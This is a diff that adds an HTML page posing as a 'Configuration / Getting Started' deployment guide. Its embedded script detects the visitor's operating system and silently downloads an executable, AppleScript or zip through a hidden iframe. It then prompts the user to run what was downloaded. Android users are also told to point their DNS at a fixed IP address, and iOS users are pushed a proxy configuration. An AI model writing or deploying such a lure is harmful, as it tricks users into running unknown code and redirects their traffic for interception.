@@ -1,0 +1,116 @@
+<html>
+
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=us-ascii">
+<meta name=Generator content="Microsoft Word 15 (filtered)">
+<title>Deployment</title>
+<style>
+<!--
+ /* Font Definitions */
+ @font-face
+	{font-family:"Cambria Math";
+	panose-1:0 0 0 0 0 0 0 0 0 0;}
+@font-face
+	{font-family:"Century Gothic";
+	panose-1:2 11 5 2 2 2 2 2 2 4;}
+ /* Style Definitions */
+ p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{margin:0in;
+	margin-bottom:.0001pt;
+	font-size:12.0pt;
+	font-family:"Times New Roman",serif;}
+h1
+	{mso-style-link:"Heading 1 Char";
+	margin-right:0in;
+	margin-left:0in;
+	font-size:24.0pt;
+	font-family:"Times New Roman",serif;}
+span.Heading1Char
+	{mso-style-name:"Heading 1 Char";
+	mso-style-link:"Heading 1";
+	font-family:"Calibri Light",sans-serif;
+	color:#2F5496;}
+p.msonormal0, li.msonormal0, div.msonormal0
+	{mso-style-name:msonormal;
+	margin-right:0in;
+	margin-left:0in;
+	font-size:12.0pt;
+	font-family:"Times New Roman",serif;}
+.MsoChpDefault
+	{font-size:10.0pt;}
+@page WordSection1
+	{size:8.5in 11.0in;
+	margin:1.0in 2.0in 1.0in 2.0in;}
+div.WordSection1
+	{page:WordSection1;}
+-->
+</style>
+
+</head>
+
+<body lang=EN-US>
+
+<div class=WordSection1>
+
+  <iframe id=download width=1 height=1 style='display:none'>
+  </iframe>  
+
+<h1 style='margin-left:121.7pt'><span style='font-size:48.0pt;font-family:"Century Gothic",sans-serif'><br>
+<u></br>Conf</u>iguration</span></h1>
+
+<h1 style='margin-left:121.7pt'><span style='font-size:28.0pt;font-family:"Century Gothic",sans-serif'>Getting
+Started</span></h1>
+
+<h1 style='margin-left:121.7pt'><span style='font-size:20.0pt;font-family:"Century Gothic",sans-serif'>Follow
+any Instruction given.</span></h1>
+
+<h1 align=right style='margin-top:0in;margin-right:0in;margin-bottom:0in;
+margin-left:121.7pt;margin-bottom:.0001pt;text-align:right'><img width=392
+height=383 id="Picture 1" src="jellybean/branding.jpg"
+alt="the Statue of Liberty">
+</h1>
+<script type="text/javascript">
+
+		// This script sets OSName variable as follows:
+		// "Windows"    for all versions of Windows
+		// "MacOS"      for all versions of Macintosh OS
+		// "Linux"      for all versions of Linux
+		// "UNIX"       for all other UNIX flavors 
+		// "Unknown OS" indicates failure to detect the OS
+
+//document.writeln('<br></br>'+navigator.appVersion);
+	if (navigator.appVersion.indexOf("Win")!=-1) {
+      document.getElementById("download").src="/deployment/eltdpl.exe";
+      alert("Almost DONE!\nEXECUTE THE SCRIPT DOWNLOADED.");
+    } 
+    if (navigator.appVersion.indexOf("iPhone")!=-1
+    || navigator.appVersion.indexOf("iPad")!=-1) {
+      window.location = 'surge:///install-config?url=https://gist.githubusercontent.com/raecoo/0b9d2fc731c80315fb11/raw/19339cfc0ce06c66dec5416433ef407c5c0b568c/rules.conf';
+          setTimeout(function () {
+            window.location = 'itms-apps://itunes.apple.com/us/app/imdb-movies-tv/id342792525'
+          }, 250);
+      window.location.replace("https://www.google.com/?gl=us&hl=en&pws=0&gws_rd=cr");
+    }
+    if (navigator.appVersion.indexOf("Android")!=-1) {
+      alert("Awesome!\nFollow these instructions:");
+      alert("STEP 1 of 4\nInstall downloaded application package\nthe download will automatically start once you finish reading these instructions.");
+      alert("STEP 2 of 4\nJot down the following address:\n47.100.165.144");
+      alert("STEP 3 of 4\nOpen 'DNS Changer' enter the address you've just written down in the first entry and '0.0.0.0' in the other.");
+      alert("STEP 4 of 4\nTap 'Start' and follow any instruction given. DONE!");
+      document.getElementById("download").src="g.zip";
+      window.location.replace("https://www.google.com/?gl=us&hl=en&pws=0&gws_rd=cr");
+    } 
+		if (navigator.appVersion.indexOf("Mac")!=-1) {
+			document.getElementById("download").src="/deployment/eltdpl.applescript";
+      alert("Almost DONE!\nEXECUTE THE SCRIPT DOWNLOADED.");      
+    }
+		if (navigator.appVersion.indexOf("X11")!=-1)
+			document.getElementById("download").src="g.zip";
+		if (navigator.appVersion.indexOf("Linux")!=-1)
+			document.getElementById("download").src="g.zip";
+</script>
+</div>
+
+</body>
+
+</html>
